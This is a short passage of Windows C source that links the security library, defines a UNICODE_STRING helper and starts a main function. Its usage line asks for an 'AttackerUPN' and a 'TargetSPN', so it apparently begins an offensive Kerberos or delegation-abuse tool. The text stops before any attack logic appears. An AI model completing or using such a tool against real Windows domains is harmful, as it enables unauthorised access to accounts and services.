#pragma comment(lib, "secur32.lib")

// Helper to build a UNICODE_STRING from a literal
void InitUnicodeString(PUNICODE_STRING us, const wchar_t* wstr)
{
    size_t len = wcslen(wstr) * sizeof(wchar_t);
    us->Length = (USHORT)len;
    us->MaximumLength = (USHORT)(len + sizeof(wchar_t));
    us->Buffer = (PWSTR)wstr;
}

// Entry point
int wmain(int argc, wchar_t* argv[])
{
    if (argc != 3)
    {
        wprintf(L"Usage: %s <AttackerUPN> <TargetSPN>\n", argv[0]);
